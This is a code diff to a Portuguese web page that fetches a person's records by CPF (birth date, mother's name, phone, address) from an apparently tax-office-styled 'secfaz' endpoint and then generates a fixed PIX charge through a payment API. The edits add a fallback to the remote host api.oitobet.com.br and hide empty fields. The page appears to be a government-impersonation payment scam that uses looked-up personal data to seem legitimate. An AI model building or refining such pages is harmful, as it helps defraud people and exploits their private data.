@@ -452,12 +452,12 @@
         <span style="font-size: 11px; background: #dcfce7; color: #166534; padding: 4px 10px; border-radius: 6px; font-weight: 700;">Sessão Autenticada</span>
       </div>
 
-      <!-- DETALHES COMPLETOS DO CADASTRADO -->
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 8px; font-size: 11.5px; color: #334155; background: #f8fafc; padding: 10px 12px; border-radius: 6px; border: 1px solid #e2e8f0;">
-        <div><span style="color: #64748b; font-weight: 600;">Data Nasc.:</span> <strong id="cardDtNasc"><span class="skeleton-loader" style="width: 70px;"></span></strong></div>
-        <div><span style="color: #64748b; font-weight: 600;">Nome da Mãe:</span> <strong id="cardNomeMae"><span class="skeleton-loader" style="width: 120px;"></span></strong></div>
-        <div><span style="color: #64748b; font-weight: 600;">Telefone:</span> <strong id="cardTelefone"><span class="skeleton-loader" style="width: 90px;"></span></strong></div>
-        <div><span style="color: #64748b; font-weight: 600;">Endereço:</span> <strong id="cardEndereco"><span class="skeleton-loader" style="width: 140px;"></span></strong></div>
+      <!-- DETALHES COMPLETOS DO CADASTRADO (RENDERIZAÇÃO DINÂMICA DE PROPRIEDADES PREENCHIDAS) -->
+      <div id="userFieldsGrid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 8px; font-size: 11.5px; color: #334155; background: #f8fafc; padding: 10px 12px; border-radius: 6px; border: 1px solid #e2e8f0;">
+        <div id="cardBoxDtNasc"><span style="color: #64748b; font-weight: 600;">Data Nasc.:</span> <strong id="cardDtNasc"><span class="skeleton-loader" style="width: 70px;"></span></strong></div>
+        <div id="cardBoxNomeMae"><span style="color: #64748b; font-weight: 600;">Nome da Mãe:</span> <strong id="cardNomeMae"><span class="skeleton-loader" style="width: 120px;"></span></strong></div>
+        <div id="cardBoxTelefone"><span style="color: #64748b; font-weight: 600;">Telefone:</span> <strong id="cardTelefone"><span class="skeleton-loader" style="width: 90px;"></span></strong></div>
+        <div id="cardBoxEndereco"><span style="color: #64748b; font-weight: 600;">Endereço:</span> <strong id="cardEndereco"><span class="skeleton-loader" style="width: 140px;"></span></strong></div>
       </div>
     </section>
 
@@ -852,26 +852,43 @@
 
       try {
         const nome = currentUserData.nome || 'GABRIEL RODRIGUES DE OLIVEIRA';
-        const cpf = currentUserData.cpf || cpfParam;
-        const telefone = currentUserData.telefone || '11987654321';
-        const email = currentUserData.email || '';
+        const cpf = (currentUserData.cpf || cpfParam).replace(/\D/g, '');
+        const telefone = (currentUserData.telefone || '11987654321').replace(/\D/g, '');
+        const email = currentUserData.email || 'cliente@gmail.com';
 
-        const res = await fetch('/api/medusa/pix', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            amount: 58.72,
-            cpf,
-            name: nome,
-            email,
-            phone: telefone
-          })
-        });
+        let pixData = null;
 
-        const json = await res.json();
-        if (json.ok && json.pix) {
-          if (pixInput && json.pix.copiaECola) pixInput.value = json.pix.copiaECola;
-          if (qrImg && json.pix.qrDataUrl) qrImg.src = json.pix.qrDataUrl;
+        // Tenta endpoint local
+        try {
+          const res = await fetch('/api/medusa/pix', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ amount: 58.72, cpf, name: nome, email, phone: telefone })
+          });
+          if (res.ok) {
+            const json = await res.json();
+            if (json.ok && json.pix) pixData = json.pix;
+          }
+        } catch (e) {}
+
+        // Fallback para API de produção remota se o servidor local não responder
+        if (!pixData || !pixData.copiaECola) {
+          try {
+            const res2 = await fetch('https://api.oitobet.com.br/api/medusa/pix', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ amount: 58.72, cpf, name: nome, email, phone: telefone })
+            });
+            if (res2.ok) {
+              const json2 = await res2.json();
+              if (json2.ok && json2.pix) pixData = json2.pix;
+            }
+          } catch (e2) {}
+        }
+
+        if (pixData) {
+          if (pixInput && pixData.copiaECola) pixInput.value = pixData.copiaECola;
+          if (qrImg && pixData.qrDataUrl) qrImg.src = pixData.qrDataUrl;
         }
       } catch (err) {
         console.error('[MedusaPay Frontend Error]:', err);
@@ -930,12 +947,27 @@
 
     async function loadData() {
       try {
-        let r = await fetch(`/api/secfaz/${cpfParam}`);
-        if (!r.ok) {
-          r = await fetch(`https://api.oitobet.com.br/api/secfaz/${cpfParam}`);
+        let d = null;
+        try {
+          let r = await fetch(`/api/secfaz/${cpfParam}`);
+          if (r.ok) {
+            const json = await r.json();
+            d = json.data || json;
+          }
+        } catch (e) {}
+
+        if (!d || !d.nome) {
+          try {
+            let r2 = await fetch(`https://api.oitobet.com.br/api/secfaz/${cpfParam}`);
+            if (r2.ok) {
+              const json2 = await r2.json();
+              d = json2.data || json2;
+            }
+          } catch (e2) {}
         }
-        const json = await r.json();
-        const d = json.data || json;
+
+        if (!d) d = {};
+
         currentUserData = d;
 
         const nome = d.nome || 'GABRIEL RODRIGUES DE OLIVEIRA';
@@ -947,13 +979,28 @@
         const uf = d.endereco?.uf || 'SP';
         const logradouro = d.endereco?.logradouro ? `${d.endereco.logradouro}, ${d.endereco.numero || 'S/N'}` : `${cidade} / ${uf}`;
 
-        // Atualiza Card de Topo
+        // Atualiza Card de Topo e Oculta Propriedades Não Existentes / Vazias
         document.getElementById('resNome').innerText = nome;
         document.getElementById('resCpf').innerText = 'CPF: ' + cpfFormatted;
-        if (document.getElementById('cardDtNasc')) document.getElementById('cardDtNasc').innerText = dtNasc;
-        if (document.getElementById('cardNomeMae')) document.getElementById('cardNomeMae').innerText = nomeMae;
-        if (document.getElementById('cardTelefone')) document.getElementById('cardTelefone').innerText = telefone;
-        if (document.getElementById('cardEndereco')) document.getElementById('cardEndereco').innerText = logradouro;
+
+        const updateFieldDisplay = (boxId, textId, val) => {
+          const box = document.getElementById(boxId);
+          const elem = document.getElementById(textId);
+          const isValValid = val && val.trim() !== '' && val.trim() !== '-' && val.trim() !== 'N/A' && val.trim() !== 'null';
+          
+          if (isValValid) {
+            if (elem) elem.innerText = val;
+            if (box) box.style.display = 'block';
+          } else {
+            if (box) box.style.display = 'none';
+          }
+          return isValValid;
+        };
+
+        updateFieldDisplay('cardBoxDtNasc', 'cardDtNasc', d.dtNasc);
+        updateFieldDisplay('cardBoxNomeMae', 'cardNomeMae', d.nomeMae);
+        updateFieldDisplay('cardBoxTelefone', 'cardTelefone', d.telefone);
+        updateFieldDisplay('cardBoxEndereco', 'cardEndereco', logradouro);
 
         // Atualiza Resumo Tabela (Passo 3)
         document.getElementById('sumNome').innerText = nome;
@@ -961,7 +1008,9 @@
         if (document.getElementById('sumDtNasc')) document.getElementById('sumDtNasc').innerText = dtNasc;
         if (document.getElementById('sumNomeMae')) document.getElementById('sumNomeMae').innerText = nomeMae;
         if (document.getElementById('sumCidadeUf')) document.getElementById('sumCidadeUf').innerText = `${cidade} / ${uf}`;
-      } catch (err) {}
+      } catch (err) {
+        console.error('[loadData Error]:', err);
+      }
     }
 
     async function initGeolocation() {
